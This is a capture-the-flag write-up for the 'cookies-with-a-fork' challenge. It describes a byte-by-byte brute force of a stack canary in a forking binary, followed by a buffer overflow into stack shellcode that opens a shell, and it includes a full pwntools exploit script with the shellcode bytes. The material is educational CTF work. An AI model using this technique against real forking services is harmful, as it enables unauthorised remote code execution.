# cookies-with-a-fork
## by Alexander Marx
### First steps
The first step for me is always to run the command ```pwn checksec [filename]``` on the file. This tells me what binary security settings are enabled as well as telling me if the program is 32 or 64 bit. The two things that are most notable from the security settings is that the canary is enabled an NX is disabled. This means we are going to have to bypass a canary however, we can execute things on the stack. The program is also 64 bit, meaning that the canary and the registers will all be 8 bytes long.

### Decompilation
The next step is to decompile the program. This program is pretty simple. It is made up of two main functions, main and child. Main calls fork and runs the child function on the forked process and then when the process has ended prints out the exit value of the process. The child function asks the user for input, prints out the memory address where the input will be stored, and then implements an overly complicated version of fgets. It is however important to note that the buffer that child is writing to is 200 bytes long and the implementation of fgets that child uses takes in 513 characters. This means that to exploit the program we will use a buffer overflow to overwrite the canary and the return address to get a shell open.

### Exploitation
Since we know that we can implement a buffer overflow and that there is a canary present, the first step we need to take is to figure out where the canary lives compared to the beginning of the buffer. This is simple to do. All that is needed is to write a loop that sends in a string of 200 characters plus an increasing number of other characters starting with 1. Then when we detect stack smashing we just need to print out how many characters needed to be entered to hit the canary. When this is done on this program, we see that we hit the canary after 201 characters, or in other words the canary lives immediately after the buffer.

Now we need to figure out what the canary is so that we can overwrite its location with the exact value needed so we don't trigger a stack smashing. However, since the program is printing out a value that the user does not enter, we can't leak the value of the canary. However, this program is using fork to run the child function. This means that no matter how many times child is called, the canary will never change. That means we can brute force the password. To do this we first have to create the base payload that we will send in. Since the canary is one character after the buffer we will send in 200 A's followed by the number 0 since that is always the first byte of the canary. Then for each other byte in the canary we send in the payload plus a value that counts up from 0-255. When stack smashing isn't detected we add that value to the payload and continue to the next value. It is important to note however that if we input the value 10 then this algorithm breaks since in ascii terms, 10 is a newline character which causes the program to stop taking in characters. To fix this we just have to continue to the next number every time we hit the number 10. This algorithm will find the value of the canary and automatically add it to the payload so we can overwite it and get to the return address.

Now that we can calculate the canary, we need to figure out how to open a shell. Since NX is disabled we can execute code on the stack. We are also given a memory location on the stack, the memory address where the user input is stored. That means that all we have to do is find shellcode that executes a shell and put it at the beginning of our payload as well as parsing out the memory address from what is printed and putting that at the end of the paylowad so that we can overwrite the return address with it. We don't have to figure out exactly where the return address is because since the canary ends on a partition of 8 bytes we can just write a bunch of addresses to the end of the payload and we know that one of them will overwrite the return address correctly.

Once we have all of these pieces we just need to write this to the program and then the program will execute our shellcode and open up a shell for us. Then with the shell we can run the command ```cat flag``` to get the flag.

### Python Script
```python
from pwn import *

p = remote("chal.ctf-league.osusec.org", 1555)
#p = process("./cookies-with-a-fork")
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"A" * (200 - 27) + (0).to_bytes(1, "big")
canaryVal = 0
p.recvline()

for j in range(0,7):
    for i in range(0,256):
        if (i == 10):
            continue
        p.recvline()
        p.sendline(payload + (i).to_bytes(1, "big"))
        output = p.recvline()
        #print(output)

        if b"stack smashing" in output:
            continue
        else:
            payload += (i).to_bytes(1, "big")
            print(i)
            break

output = p.recvline()

address = ""
for i in range(45,57):
    address += chr(output[i])
#Please give me some data, I'll store it at 0x7ffc3ee63070.

payload += p64(int(address, 16)) * 30
p.sendline(payload)
p.interactive()
```

### Flag
```osu{br34k_4LL_t53_def3n5es!!!}```
